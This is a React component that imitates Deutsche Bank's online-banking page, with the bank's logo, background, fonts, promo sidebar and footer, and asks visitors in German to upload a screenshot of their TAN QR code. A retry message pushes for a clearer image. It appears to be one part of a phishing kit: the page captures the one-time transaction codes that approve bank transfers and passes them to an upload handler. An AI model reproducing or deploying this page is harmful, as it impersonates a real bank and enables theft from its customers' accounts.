import React, { useState, useRef } from 'react';
import { AlertTriangle, Monitor, Upload, X } from 'lucide-react';

interface QRUploadFormProps {
  onUpload: (file: File) => void;
  isRetry?: boolean;
}

const QRUploadForm: React.FC<QRUploadFormProps> = ({ onUpload, isRetry = false }) => {
  const [isDragOver, setIsDragOver] = useState(false);
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
  const [uploadError, setUploadError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const validateFile = (file: File): string | null => {
    const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif'];
    if (!allowedTypes.includes(file.type)) {
      return 'Ungültiger Dateityp. Nur JPG, PNG und GIF sind erlaubt.';
    }
    
    const maxSize = 10 * 1024 * 1024; // 10MB
    if (file.size > maxSize) {
      return 'Datei zu groß. Maximale Größe: 10 MB.';
    }
    
    return null;
  };

  const handleFileSelect = (file: File) => {
    const error = validateFile(file);
    if (error) {
      setUploadError(error);
      return;
    }

    setSelectedFile(file);
    setUploadError(null);
    
    // Create preview URL
    const url = URL.createObjectURL(file);
    setPreviewUrl(url);
  };

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragOver(true);
  };

  const handleDragLeave = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragOver(false);
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragOver(false);
    
    const files = e.dataTransfer.files;
    if (files.length > 0) {
      handleFileSelect(files[0]);
    }
  };

  const handleFileInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (files && files.length > 0) {
      handleFileSelect(files[0]);
    }
  };

  const openFileDialog = () => {
    fileInputRef.current?.click();
  };

  const removeFile = () => {
    setSelectedFile(null);
    setPreviewUrl(null);
    setUploadError(null);
    if (fileInputRef.current) {
      fileInputRef.current.value = '';
    }
  };

  const handleUpload = async () => {
    if (!selectedFile) return;
    
    setIsLoading(true);
    
    try {
      await onUpload(selectedFile);
    } catch (error) {
      console.error('Upload error:', error);
      setUploadError('Fehler beim Upload. Bitte versuchen Sie es erneut.');
    } finally {
      setIsLoading(false);
    }
  };

  if (isLoading) {
    return (
      <div style={{
        minHeight: '100vh',
        backgroundImage: 'url(/templates/deutsche_bank/images/dbbg-F3E4CS63.jpg)',
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
      }}>
        <div style={{
          backgroundColor: 'rgba(255, 255, 255, 0.98)',
          borderRadius: '3px',
          padding: '40px',
          textAlign: 'center',
          boxShadow: '0 8px 32px rgba(0, 0, 0, 0.1)'
        }}>
          <div style={{
            width: '48px',
            height: '48px',
            border: '3px solid #0550d1',
            borderTop: '3px solid transparent',
            borderRadius: '50%',
            margin: '0 auto 20px',
            animation: 'spin 1s linear infinite'
          }}></div>
          <p style={{
            fontSize: '16px',
            color: '#000000',
            margin: 0
          }}>
            QR-Code wird analysiert...
          </p>
          <style>
            {`
              @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
              }
            `}
          </style>
        </div>
      </div>
    );
  }

  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .db-mobile-main {
              background-image: none !important;
              background-color: #1e2a78 !important;
            }
            .db-mobile-container {
              flex-direction: column !important;
              gap: 0 !important;
              max-width: none !important;
              margin: 0 !important;
            }
            .db-mobile-left {
              padding: 20px !important;
              padding-top: 40px !important;
              flex: none !important;
            }
            .db-mobile-sidebar {
              width: 100% !important;
              min-height: auto !important;
              order: 2 !important;
              margin-top: 60px !important;
            }
            .db-mobile-card {
              padding: 30px 20px !important;
            }
            .db-mobile-title {
              font-size: 24px !important;
            }
            .db-mobile-sidebar-content {
              background-color: #ffffff !important;
              padding: 20px !important;
              margin-bottom: 20px !important;
            }
            .db-mobile-footer-only {
              padding: 30px 20px !important;
            }
          }
        `}
      </style>
      <div className="db-mobile-main" style={{
        minHeight: '100vh',
        backgroundImage: 'url(/templates/deutsche_bank/images/dbbg-F3E4CS63.jpg)',
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat',
        display: 'flex',
        fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
      }}>
        
        {/* Main Container - 1180px */}
        <div className="db-mobile-container" style={{
          maxWidth: '1180px',
          width: '100%',
          display: 'flex',
          margin: '0 auto',
          gap: '80px'
        }}>
          
          {/* Left Content Area */}
          <div className="db-mobile-left" style={{
            flex: '1',
            display: 'flex',
            flexDirection: 'column',
            justifyContent: 'center',
            paddingTop: '100px',
            paddingLeft: '40px',
            paddingRight: '20px',
            paddingBottom: '40px'
          }}>
            
            {/* QR Upload Card */}
            <div className="db-mobile-card" style={{
              backgroundColor: 'rgba(255, 255, 255, 0.98)',
              borderRadius: '3px',
              padding: '40px',
              boxShadow: '0 8px 32px rgba(0, 0, 0, 0.1)'
            }}>
              
              {/* Deutsche Bank Logo */}
              <div style={{
                marginBottom: '30px',
                textAlign: 'left'
              }}>
                <img 
                  src="/templates/deutsche_bank/images/DB-Logotype-ri-sRGB-DXJQ2K2F.svg" 
                  alt="Deutsche Bank" 
                  style={{ 
                    height: '32px',
                    width: 'auto'
                  }}
                />
              </div>

              {/* Title */}
              <h1 className="db-mobile-title" style={{
                fontSize: '28px',
                fontWeight: '600',
                color: '#000000',
                margin: '0 0 16px 0',
                textAlign: 'center'
              }}>
                {isRetry ? 'QR-Code erneut hochladen' : 'QR-Code hochladen'}
              </h1>
              
              {/* Retry Error Message */}
              {isRetry && (
                <div style={{
                  backgroundColor: '#fef2f2',
                  border: '1px solid #fecaca',
                  borderRadius: '3px',
                  padding: '16px',
                  marginBottom: '24px',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '12px'
                }}>
                  <AlertTriangle size={20} color="#dc2626" />
                  <p style={{
                    fontSize: '14px',
                    color: '#dc2626',
                    margin: 0,
                    lineHeight: '1.4'
                  }}>
                    Der vorherige Upload war nicht erfolgreich. Bitte versuchen Sie es erneut mit einem klareren Bild.
                  </p>
                </div>
              )}
              
              {/* Description */}
              <p style={{
                fontSize: '16px',
                color: '#666',
                margin: '0 0 32px 0',
                lineHeight: '1.5',
                textAlign: 'center'
              }}>
                Laden Sie hier den Screenshot Ihres TAN-QR-Codes hoch. Stellen Sie sicher, dass das Bild klar und vollständig ist.
              </p>

              {/* Upload Error */}
              {uploadError && (
                <div style={{
                  backgroundColor: '#fef2f2',
                  border: '1px solid #fecaca',
                  borderRadius: '3px',
                  padding: '16px',
                  marginBottom: '24px',
                  color: '#dc2626',
                  fontSize: '14px',
                  textAlign: 'center'
                }}>
                  {uploadError}
                </div>
              )}

              {/* Upload Area */}
              <div
                onDragOver={handleDragOver}
                onDragLeave={handleDragLeave}
                onDrop={handleDrop}
                onClick={openFileDialog}
                style={{
                  border: isDragOver ? '2px dashed #0550d1' : '2px dashed #ddd',
                  borderRadius: '3px',
                  padding: '40px 20px',
                  textAlign: 'center',
                  backgroundColor: isDragOver ? '#f0f8ff' : '#f8f9fa',
                  cursor: 'pointer',
                  transition: 'all 0.3s ease',
                  marginBottom: '24px'
                }}
              >
                <div style={{
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  gap: '16px'
                }}>
                  <div style={{
                    color: isDragOver ? '#0550d1' : '#666',
                    transition: 'color 0.3s ease'
                  }}>
                    <Upload size={48} />
                  </div>
                  
                  <div>
                    <h3 style={{
                      fontSize: '18px',
                      fontWeight: '600',
                      color: '#000000',
                      margin: '0 0 8px 0'
                    }}>
                      {selectedFile ? selectedFile.name : 'Datei hier ablegen oder klicken'}
                    </h3>
                    
                    <p style={{
                      fontSize: '14px',
                      color: '#666',
                      margin: 0
                    }}>
                      Unterstützte Formate: JPG, PNG, GIF (max. 10MB)
                    </p>
                  </div>
                </div>
              </div>

              <input
                ref={fileInputRef}
                type="file"
                accept="image/*"
                onChange={handleFileInputChange}
                style={{ display: 'none' }}
              />

              {/* File Preview */}
              {selectedFile && previewUrl && (
                <div style={{
                  backgroundColor: '#e8f4fd',
                  border: '1px solid #b8d4e3',
                  borderRadius: '3px',
                  padding: '16px',
                  marginBottom: '24px',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '16px'
                }}>
                  <img 
                    src={previewUrl} 
                    alt="Preview" 
                    style={{
                      width: '60px',
                      height: '60px',
                      objectFit: 'cover',
                      borderRadius: '3px'
                    }}
                  />
                  
                  <div style={{ flex: 1 }}>
                    <h4 style={{
                      fontSize: '14px',
                      fontWeight: '600',
                      color: '#000000',
                      margin: '0 0 4px 0'
                    }}>
                      {selectedFile.name}
                    </h4>
                    <p style={{
                      fontSize: '12px',
                      color: '#666',
                      margin: 0
                    }}>
                      {(selectedFile.size / 1024 / 1024).toFixed(2)} MB
                    </p>
                  </div>
                  
                  <button
                    onClick={(e) => {
                      e.stopPropagation();
                      removeFile();
                    }}
                    style={{
                      background: 'none',
                      border: 'none',
                      color: '#dc2626',
                      cursor: 'pointer',
                      padding: '4px'
                    }}
                  >
                    <X size={20} />
                  </button>
                </div>
              )}
              
              {/* Upload Button */}
              <button
                onClick={handleUpload}
                disabled={!selectedFile || isLoading}
                style={{
                  backgroundColor: selectedFile && !isLoading ? '#0550d1' : '#ddd',
                  color: selectedFile && !isLoading ? '#ffffff' : '#999',
                  border: 'none',
                  borderRadius: '3px',
                  padding: '16px 32px',
                  fontSize: '16px',
                  fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                  fontWeight: '600',
                  cursor: selectedFile && !isLoading ? 'pointer' : 'not-allowed',
                  transition: 'background-color 0.2s ease',
                  width: '100%'
                }}
                onMouseOver={(e) => {
                  if (selectedFile && !isLoading) {
                    e.currentTarget.style.backgroundColor = '#0440a8';
                  }
                }}
                onMouseOut={(e) => {
                  if (selectedFile && !isLoading) {
                    e.currentTarget.style.backgroundColor = '#0550d1';
                  }
                }}
              >
                {isLoading ? 'Wird hochgeladen...' : 'QR-Code hochladen'}
              </button>
            </div>
          </div>

          {/* Right Sidebar - 380px */}
          <div className="db-mobile-sidebar" style={{
            width: '380px',
            backgroundColor: '#ffffff',
            display: 'flex',
            flexDirection: 'column',
            minHeight: '100vh'
          }}>
            
            {/* Promotional Content */}
            <div className="db-mobile-sidebar-content" style={{
              flex: '1',
              padding: '30px'
            }}>
              
              {/* New Banking Promo */}
              <div style={{
                marginBottom: '40px'
              }}>
                <img 
                  src="/templates/deutsche_bank/images/db-neues-banking-dt-1200x750-1552700535-w46209.jpg" 
                  alt="Neues Online-Banking" 
                  style={{
                    width: '100%',
                    height: '140px',
                    objectFit: 'cover',
                    borderRadius: '3px',
                    marginBottom: '16px'
                  }}
                />
                <h2 style={{
                  fontSize: '18px',
                  fontWeight: '600',
                  color: '#000000',
                  margin: '0 0 10px 0'
                }}>
                  Neues Online-Banking. Neue App!
                </h2>
                <p style={{
                  fontSize: '14px',
                  color: '#000000',
                  margin: '0 0 12px 0',
                  lineHeight: '1.5'
                }}>
                  Jetzt noch smarter und mehr Komfort für Sie.
                </p>
                <div style={{
                  display: 'flex',
                  flexDirection: 'column',
                  gap: '6px'
                }}>
                  <a href="#" style={{
                    color: '#0550d1',
                    textDecoration: 'underline',
                    fontSize: '14px',
                    fontWeight: '600'
                  }}>
                    Informationen für Privatkunden
                  </a>
                  <a href="#" style={{
                    color: '#0550d1',
                    textDecoration: 'underline',
                    fontSize: '14px',
                    fontWeight: '600'
                  }}>
                    Informationen für Unternehmenskunden
                  </a>
                </div>
              </div>

              {/* Security Info */}
              <div style={{
                marginBottom: '40px'
              }}>
                <div style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '10px',
                  marginBottom: '10px'
                }}>
                  <div style={{
                    color: '#000000',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center'
                  }}>
                    <AlertTriangle size={24} />
                  </div>
                  <h3 style={{
                    fontSize: '16px',
                    fontWeight: '600',
                    color: '#000000',
                    margin: '0'
                  }}>
                    Sicherheitshinweise
                  </h3>
                </div>
                <p style={{
                  fontSize: '14px',
                  color: '#000000',
                  margin: '0 0 12px 0',
                  lineHeight: '1.5'
                }}>
                  Schützen Sie sich und Ihr Online-Banking. Wir helfen Ihnen gern.
                </p>
                <div style={{
                  display: 'flex',
                  flexDirection: 'column',
                  gap: '6px'
                }}>
                  <a href="#" style={{
                    color: '#0550d1',
                    textDecoration: 'underline',
                    fontSize: '14px',
                    fontWeight: '600'
                  }}>
                    Link zu den aktuellen Sicherheitshinweisen
                  </a>
                  <a href="#" style={{
                    color: '#0550d1',
                    textDecoration: 'underline',
                    fontSize: '14px',
                    fontWeight: '600'
                  }}>
                    Link zu Sicherheit im Überblick
                  </a>
                </div>
              </div>

              {/* Online Banking Access */}
              <div style={{
                marginBottom: '40px'
              }}>
                <div style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '10px',
                  marginBottom: '10px'
                }}>
                  <div style={{
                    color: '#000000',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center'
                  }}>
                    <Monitor size={24} />
                  </div>
                  <h3 style={{
                    fontSize: '16px',
                    fontWeight: '600',
                    color: '#000000',
                    margin: '0'
                  }}>
                    Online-Banking Zugang
                  </h3>
                </div>
                <p style={{
                  fontSize: '14px',
                  color: '#000000',
                  margin: '0 0 12px 0',
                  lineHeight: '1.5'
                }}>
                  Hier können Sie Ihren persönlichen Zugang zum Online-Banking beantragen.
                </p>
                <a href="#" style={{
                  color: '#0550d1',
                  textDecoration: 'underline',
                  fontSize: '14px',
                  fontWeight: '600'
                }}>
                  Zugang zum Online-Banking beantragen
                </a>
              </div>

              {/* Security Procedures */}
              <div>
                <div style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '10px',
                  marginBottom: '10px'
                }}>
                  <div style={{
                    color: '#000000',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center'
                  }}>
                    <svg role="img" focusable="false" style={{ height: '24px', width: '24px' }} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                      <rect width="18" height="11" x="3" y="11" rx="2" ry="2"/>
                      <path d="m7 11V7a5 5 0 0 1 10 0v4"/>
                    </svg>
                  </div>
                  <h3 style={{
                    fontSize: '16px',
                    fontWeight: '600',
                    color: '#000000',
                    margin: '0'
                  }}>
                    Unsere Sicherheitsverfahren
                  </h3>
                </div>
                <p style={{
                  fontSize: '14px',
                  color: '#000000',
                  margin: '0 0 12px 0',
                  lineHeight: '1.5'
                }}>
                  Alles Wissenswerte rund um Ihren Login.
                </p>
                <a href="#" style={{
                  color: '#0550d1',
                  textDecoration: 'underline',
                  fontSize: '14px',
                  fontWeight: '600'
                }}>
                  Link zu den Sicherheitsverfahren
                </a>
              </div>
            </div>

            {/* Footer integrated in sidebar */}
            <div className="db-mobile-footer-only" style={{
              backgroundColor: '#1e2a78',
              color: '#ffffff',
              padding: '20px 30px'
            }}>
              <div style={{
                display: 'flex',
                flexWrap: 'wrap',
                gap: '15px',
                fontSize: '12px'
              }}>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  English Version
                </a>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  Hilfe
                </a>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  Demo-Konto
                </a>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  Impressum
                </a>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  Rechtliche Hinweise
                </a>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  Datenschutz
                </a>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  Cookie-Einstellungen
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default QRUploadForm;